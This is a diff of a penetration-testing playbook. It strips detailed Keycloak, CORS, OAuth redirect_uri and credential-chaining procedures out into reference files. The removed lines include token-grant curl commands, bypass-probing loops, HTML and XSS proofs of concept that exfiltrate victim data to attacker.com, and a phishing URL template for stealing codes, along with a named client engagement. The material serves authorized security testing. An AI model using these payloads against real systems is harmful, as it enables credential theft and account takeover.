@@ -882,33 +882,12 @@ When redoing a pentest or reassessing previously reported findings:
    ```
 5. **Incomplete fixes are findings** — document as "Incomplete Remediation" with reference to the original finding ID. Severity remains the same (or higher if the incomplete fix creates false confidence).
 
-### Credential Chaining
+### Credential Chaining & Cross-Environment Pivoting
 
-When credentials are discovered (heapdump, JS files, CTI, Snyk), systematically chain them across environments and services:
-
-```
-Discovery → Validation → Escalation → Lateral Movement
-```
-
-| Step | Action | Example |
-|------|--------|---------|
-| 1. Discover | Extract credential from source | Heapdump → `github-actions-sa` token |
-| 2. Validate | Confirm credential works in source env | Token valid on SIT Keycloak |
-| 3. Escalate | Check if same credential works in higher env | Test token against prod Keycloak |
-| 4. Pivot | Use credential to access other services | SA token → enumerate all microservices |
-| 5. Chain | Use new access to find more credentials | Microservice config → DB password → more data |
-
-### Cross-Environment Pivoting
-
-Production environments often share credentials, service accounts, or trust relationships with lower environments. Test these pivot paths:
-
-| Source Environment | Pivot Vector | Target |
-|-------------------|-------------|--------|
-| Mock/Dev heapdump | Service account tokens | SIT/UAT Keycloak |
-| SIT Keycloak | Same SA credentials | Prod Keycloak |
-| GitHub Actions secrets | CI/CD service accounts | All environments |
-| Snyk token | Org-wide vulnerability data | All repos/projects |
-| JS bundles (any env) | Hardcoded API keys | Prod APIs |
+**Full reference:** See `references/credential-chaining.md` and `references/credential-inventory-structure.md` for:
+- Discovery → Validation → Escalation → Lateral Movement workflow
+- Cross-environment pivot paths (mock heapdump → prod access)
+- Credential inventory tracking and chain documentation
 
 **Key principle:** Lower environments are often less protected but share credentials with production. A heapdump from mock can yield prod access.
 
@@ -926,267 +905,38 @@ Production environments often share credentials, service accounts, or trust rela
 
 ### Token Exchange & Authentication Bypass
 
-When a Keycloak token endpoint is found:
-
-1. **Identify public clients** — try `admin-cli`, `account` (Keycloak defaults), app-specific names
-2. **Distinguish client types:**
-   - "Public client not allowed to retrieve service account" = valid public client → use password grant
-   - "Invalid client or Invalid client credentials" = either doesn't exist OR is confidential (needs secret)
-3. **Password grant with public client:**
-   ```bash
-   curl -X POST "$KEYCLOAK_URL/protocol/openid-connect/token" \
-     -d "grant_type=password&client_id=admin-cli&username=$USER&password=$PASS"
-   ```
-4. **Client credentials with confidential client:**
-   ```bash
-   curl -X POST "$KEYCLOAK_URL/protocol/openid-connect/token" \
-     -d "grant_type=client_credentials&client_id=$CLIENT&client_secret=$SECRET"
-   ```
-5. **Token introspection** (if accessible):
-   ```bash
-   curl -X POST "$KEYCLOAK_URL/protocol/openid-connect/token/introspect" \
-     -d "token=$TOKEN&client_id=admin-cli"
-   ```
+**Full reference:** See `references/keycloak-assessment.md` and `references/oauth-sso-attack-chains.md` (Keycloak-Specific Chains) for:
+- Public client identification and enumeration
+- Password grant vs client credentials grant
+- Token introspection and exchange
+- Service account escalation and impersonation
 
 ### CORS Origin Reflection Testing (MANDATORY Phase 5)
 
-**Why mandatory:** CORS misconfiguration with credentials is a standalone Critical finding for financial services. It enables cross-origin identity theft without any other vulnerability. The BFI engagement found arbitrary origin reflection + credentials on production Keycloak `/userinfo` — any malicious page could steal employee identity.
+**Full reference:** See `references/oauth-sso-attack-chains.md` (Chain 3: CORS Misconfiguration) for:
+- Complete origin test payloads and rationale (7 bypass variants)
+- Interpretation guide (ACAO + ACAC combinations → severity)
+- Exploitation PoC templates (XHR, sandboxed iframe, XSS chain)
+- Key targets and reporting guidance for financial services
 
-**Procedure (run on ALL auth endpoints discovered in Phases 1-5):**
-
-```bash
-# Test targets: Keycloak userinfo, token endpoints, any authenticated API
-TARGETS=(
-  "https://target/keycloak/realms/REALM/protocol/openid-connect/userinfo"
-  "https://target/keycloak/realms/REALM/protocol/openid-connect/token"
-  "https://target/api/v1/user/profile"
-  # Add all auth-bearing endpoints
-)
-
-for URL in "${TARGETS[@]}"; do
-  echo "=== $URL ==="
-  for origin in \
-    "https://evil.com" \
-    "https://target.com.attacker.com" \
-    "https://attackertarget.com" \
-    "https://target.com.evil.net" \
-    "http://target.com" \
-    "null" \
-    "https://localhost"; do
-    echo -n "  Origin: $origin → "
-    curl -sk -H "Origin: $origin" -D- "$URL" 2>/dev/null | grep -i "access-control-allow"
-  done
-done
-```
-
-**Origin test rationale:**
-- `https://evil.com` — arbitrary origin (full reflection)
-- `https://target.com.attacker.com` — suffix bypass (whitelist checks "ends with target.com")
-- `https://attackertarget.com` — prefix bypass (whitelist checks "contains target.com")
-- `https://target.com.evil.net` — subdomain-of-attacker bypass
-- `http://target.com` — TLS downgrade (HTTPS app trusts HTTP origin → MitM exploitable)
-- `null` — sandboxed iframe exploit (whitelisted for local dev)
-- `https://localhost` — dev origin left in whitelist
-
-**Interpretation:**
-- `ACAO: <reflected>` + `ACAC: true` → **CRITICAL** — exploitable cross-origin credential theft
-- `ACAO: null` + `ACAC: true` → **CRITICAL** — exploitable via sandboxed iframe
-- `ACAO: *` + `ACAC: true` → Browser contradiction (browsers ignore credentials with wildcard) — still document as misconfiguration (Medium)
-- `ACAO: *` without `ACAC` → Low risk (no credential leakage)
-- `ACAO: <specific trusted origin>` → Properly configured
-
-**Key targets for CORS testing:**
-- Keycloak `/userinfo` (identity theft)
-- Any `/me` or `/profile` endpoint
-- Token endpoints (token theft)
-- API endpoints that return sensitive data with session cookies
-
-**Report as Critical when:** Origin reflection + credentials + endpoint returns PII/session data. For financial services, this violates POJK 11/2022 (employee identity protection).
-
-**Exploitation PoC (include in finding evidence):**
-
-When CORS reflection is confirmed, include this ready-to-use exploit template in the finding:
-
-```html
-<!-- CORS Exploit — Origin Reflection with Credentials -->
-<html>
-<body>
-<h1>CORS PoC — Data Exfiltration</h1>
-<script>
-var req = new XMLHttpRequest();
-req.onload = function() {
-  // Display stolen data
-  document.getElementById('result').innerText = this.responseText;
-  // Exfiltrate to attacker server
-  fetch('https://attacker.com/log?data=' + btoa(this.responseText));
-};
-req.open('GET', 'https://VULNERABLE-TARGET/keycloak/realms/REALM/protocol/openid-connect/userinfo', true);
-req.withCredentials = true;
-req.send();
-</script>
-<pre id="result">Waiting for data...</pre>
-</body>
-</html>
-```
-
-**For null origin exploitation (sandboxed iframe):**
-
-```html
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
-  srcdoc="<script>
-    var req = new XMLHttpRequest();
-    req.onload = function() {
-      // Origin is 'null' from sandboxed iframe
-      document.location = 'https://attacker.com/log?data=' + btoa(this.responseText);
-    };
-    req.open('GET', 'https://VULNERABLE-TARGET/api/sensitive-data', true);
-    req.withCredentials = true;
-    req.send();
-  </script>">
-</iframe>
-```
-
-**Attack chain: XSS on trusted subdomain → CORS data theft:**
-
-If the target trusts `*.target.com` origins and you find XSS on any subdomain (e.g., `blog.target.com`), chain them:
-1. Find XSS on trusted subdomain (even reflected XSS works)
-2. XSS payload makes credentialed CORS request to main app
-3. Main app reflects the trusted subdomain origin + credentials
-4. Attacker steals victim's data via the XSS → CORS chain
-
-```
-https://blog.target.com/search?q=<script>
-  fetch('https://api.target.com/user/profile',{credentials:'include'})
-  .then(r=>r.text())
-  .then(d=>fetch('https://attacker.com/steal?d='+btoa(d)))
-</script>
-```
-
-This upgrades a "Low" reflected XSS on a blog to a "Critical" account takeover on the main API.
+**Minimum checklist:** Test ALL auth endpoints with `Origin: https://evil.com` + check for `Access-Control-Allow-Credentials: true`. If reflected → Critical. Load full reference for bypass variants and PoC templates.
 
 ### OAuth/OIDC redirect_uri Validation Testing (MANDATORY Phase 5/6)
 
-**Why mandatory:** Open redirect on OAuth authorization endpoints is a standalone Critical finding for any application using OAuth/OIDC. It enables authorization code theft without any other vulnerability — the attacker gets a valid token after the victim authenticates legitimately. The URL starts with the legitimate domain (passes email filters and user suspicion), making it a high-success-rate phishing vector.
+**Full reference:** See `references/oauth-sso-attack-chains.md` for:
+- Complete redirect_uri bypass payloads (8 variants including parse differentials)
+- Client enumeration methodology (defaults + JS bundle extraction)
+- PKCE enforcement check (determines if stolen code is usable)
+- Full attack chain documentation (phishing URL → code theft → token exchange → ATO)
+- Keycloak-specific chains (admin-cli, realm confusion, service account escalation)
+- Severity guidance (public client + no PKCE + open redirect = Critical 8.1+)
 
-**Real-world example (BFI Finance, May 2026):**
-- All Keycloak public clients (los-operation, los-surveyor, admin-cli, account) accepted ANY redirect_uri
-- No PKCE required — authorization code directly exchangeable for JWT
-- No client_secret needed (public client) — attacker only needs the stolen code
-- Result: CVSS 8.1 Critical — any employee who clicks a link loses their session to the attacker
-
-**Procedure (run on ALL OAuth/OIDC authorization endpoints discovered in Phases 1-5):**
-
-**Step 1: Discover authorization endpoints**
-```bash
-# From .well-known discovery
-curl -sk "https://target/realms/REALM/.well-known/openid-configuration" | jq '.authorization_endpoint'
-curl -sk "https://target/.well-known/openid-configuration" | jq '.authorization_endpoint'
-
-# Common paths to try
-AUTHZ_PATHS=(
-  "/realms/{realm}/protocol/openid-connect/auth"   # Keycloak
-  "/oauth/authorize"                                 # Generic
-  "/oauth2/authorize"                                # AWS Cognito
-  "/authorize"                                       # Auth0
-  "/connect/authorize"                               # IdentityServer
-)
-```
-
-**Step 2: Enumerate clients**
-```bash
-# Known defaults (always try these)
-CLIENTS=("admin-cli" "account" "public-client")
-
-# Extract from JS bundles (found in Phase 3)
-grep -roh 'clientId["\s:=]*["'"'"']\([^"'"'"']*\)' ./ptest-output/enumeration/ | sort -u
-
-# Try application-specific names
-CLIENTS+=("los-operation" "los-surveyor" "dashboard" "mobile-app" "web-app")
-```
-
-**Step 3: Test redirect_uri variations**
-```bash
-AUTH_ENDPOINT="https://target/realms/REALM/protocol/openid-connect/auth"
-
-for CLIENT in "${CLIENTS[@]}"; do
-  echo "=== Client: $CLIENT ==="
-  for redirect in \
-    "https://evil.com" \
-    "https://legitimate.com.evil.com" \
-    "https://legitimate.com@evil.com" \
-    "https://evil.com/legitimate.com" \
-    "http://legitimate.com" \
-    "https://legitimate.com%0d%0a" \
-    "https://legitimate.com/../evil.com" \
-    "https://evil.com#legitimate.com"; do
-    
-    RESP=$(curl -sk -o /dev/null -w "%{http_code}:%{redirect_url}" \
-      "$AUTH_ENDPOINT?client_id=$CLIENT&redirect_uri=$redirect&response_type=code&scope=openid")
-    CODE=$(echo $RESP | cut -d: -f1)
-    echo "  redirect_uri=$redirect → $CODE"
-  done
-done
-```
-
-**Step 4: Interpretation**
-
-| Response | Meaning | Severity |
-|----------|---------|----------|
-| 302 → login page (or 200 login form) | redirect_uri ACCEPTED — will be used after auth | **Critical** |
-| 400 + "Invalid redirect_uri" | Properly validated — this redirect is rejected | Safe |
-| 400 + "Invalid client" / "Client not found" | Client doesn't exist — try others | N/A |
-| 302 → error page with "redirect_uri mismatch" | Validated but shows error | Safe |
-
-**Key distinction:** If the server shows a login page (not an error), the redirect_uri is accepted and WILL be used to redirect the authorization code after successful authentication. This is the critical indicator.
-
-**Step 5: Confirm exploitability (if redirect_uri accepted)**
-```bash
-# Check if client is public (no secret needed for code exchange)
-curl -sk -X POST "$TOKEN_ENDPOINT" \
-  -d "grant_type=authorization_code&code=FAKE&client_id=$CLIENT&redirect_uri=https://evil.com"
-# "Invalid authorization code" = public client (no secret required!) → CRITICAL
-# "Missing client_secret" = confidential client → still High (secret may be leaked elsewhere)
-
-# Check if PKCE is required
-curl -sk "$AUTH_ENDPOINT?client_id=$CLIENT&redirect_uri=https://evil.com&response_type=code&scope=openid"
-# If login page shows WITHOUT code_challenge parameter → PKCE not enforced → code directly usable
-
-# Check MFA enforcement
-# If Google Workspace SSO: MFA depends on Google org policy, not Keycloak
-# If Keycloak local auth: check if OTP is required (try password grant to confirm)
-```
-
-**Step 6: Document the full attack chain**
-```markdown
-Attack Chain:
-1. Attacker crafts URL: {authorization_endpoint}?client_id={public_client}&redirect_uri=https://evil.com/steal&response_type=code&scope=openid
-2. Victim clicks link → sees legitimate login page (domain is trusted)
-3. Victim authenticates (Google SSO / username+password)
-4. Keycloak redirects to: https://evil.com/steal?code=AUTH_CODE&session_state=...
-5. Attacker exchanges code: POST /token grant_type=authorization_code&code=AUTH_CODE&client_id={client}&redirect_uri=https://evil.com/steal
-6. Attacker receives: {"access_token":"eyJ...","refresh_token":"...","token_type":"bearer"}
-7. Attacker accesses all services the victim can access
-```
-
-**PoC phishing URL template (include in finding):**
-```
-https://{auth-domain}/realms/{realm}/protocol/openid-connect/auth?client_id={public-client}&redirect_uri=https%3A%2F%2Fattacker.com%2Fsteal&response_type=code&scope=openid&state=random123
-```
-
-**Checklist (add to Phase 5/6):**
+**Minimum checklist:**
 - [ ] Discover all OAuth/OIDC authorization endpoints (.well-known)
 - [ ] Enumerate all client_ids (defaults + JS bundle extraction)
 - [ ] Test arbitrary redirect_uri on each client
-- [ ] If accepted: confirm client is public (no secret for code exchange)
-- [ ] If accepted: confirm PKCE is NOT required
-- [ ] If accepted: document full attack chain with PoC URL
-- [ ] Test on ALL Keycloak instances/realms (prod, nonprod, all gateways)
-
-**Severity guidance:**
-- Public client + no redirect_uri validation + no PKCE = **Critical (8.1+)**
-- Confidential client + no redirect_uri validation = **High (7.1)** (secret may be leaked)
-- redirect_uri accepts subdomain variations only (e.g., *.legitimate.com) = **Medium (5.4)** (requires subdomain takeover)
-- PKCE enforced but redirect_uri open = **Medium (4.7)** (code unusable without verifier, but still an open redirect)
+- [ ] If accepted: confirm public client + no PKCE
+- [ ] Document full attack chain with PoC URL
 
 ### OTP/2FA Endpoint Testing (MANDATORY when OTP endpoints exist)
 
@@ -1227,47 +977,26 @@ When WAF blocks sensitive paths (actuator, swagger, admin), try these in order:
 
 ### Exploiting Exposed Keycloak via Gateway
 
-When Keycloak is proxied through an API gateway (common in GKE/Istio):
-
-1. **Discover the path:** Try `/keycloak/`, `/auth/`, `/sso/`, `/oauth/` on the gateway
-2. **Enumerate realms:** `/keycloak/realms/{name}/.well-known/openid-configuration`
-3. **Find public clients:** Test `admin-cli`, `account`, app-specific names with client_credentials grant
-4. **Username enumeration:** Different error messages reveal valid usernames
-5. **Password spray:** Use discovered usernames with common/leaked passwords (REQUIRES explicit authorization)
-6. **Token analysis:** Decode obtained JWTs to understand roles, permissions, audience
+**Full reference:** See `references/keycloak-gateway-exploitation.md` and `references/keycloak-assessment.md` for:
+- Gateway path discovery (/keycloak/, /auth/, /sso/)
+- Realm enumeration and public client identification
+- Username enumeration and password spray (with authorization)
+- Token analysis and service account escalation
 
 ### Production Microservice Exploitation (with valid JWT)
 
-Once a valid JWT is obtained:
-
-```bash
-# Test each service with the token
-for svc in bpm agent agreement branch customer edoc; do
-  curl -sk -H "Authorization: Bearer $JWT" "https://target/$svc/v1/" -w "%{http_code}\n"
-done
-
-# Try actuator with auth (may be allowed for authenticated users)
-curl -sk -H "Authorization: Bearer $JWT" "https://target/$svc/actuator/"
-
-# Enumerate API endpoints via swagger
-curl -sk -H "Authorization: Bearer $JWT" "https://target/$svc/v3/api-docs"
-```
+**Full reference:** See `references/authenticated-testing-playbook.md` for:
+- Systematic service enumeration with valid token
+- Actuator/swagger access with auth (reveals more than unauth)
+- Cross-service token validation testing
+- Data exfiltration scope documentation
 
 ### Snyk Data as Attack Intelligence
 
-When Snyk enumeration data is available:
-
-1. **Extract exploitable CVEs** — filter for Critical/High with known exploits
-2. **Map CVEs to services** — match package names to discovered microservices
-3. **Prioritize by reachability** — focus on CVEs in internet-facing services
-4. **Check for open redirect** — common in Spring Boot, enables phishing/token theft
-5. **Check for deserialization** — common in Java services, enables RCE
-6. **Check for SSRF** — common in services that make outbound calls
-
-```bash
-# Extract high-severity CVEs with exploits from Snyk data
-cat snyk-enum-data.json | jq '[.[] | select(.severity == "critical" or .severity == "high") | {id: .id, title: .title, package: .packageName, version: .version, exploit: .exploit}]'
-```
+**Full reference:** See `references/snyk-token-enumeration.md` for:
+- Extracting exploitable CVEs from Snyk data
+- Mapping CVEs to discovered microservices
+- Prioritization by reachability and exploit availability
 
 ## Phase 7: Post-Exploitation — Structured Framework
 
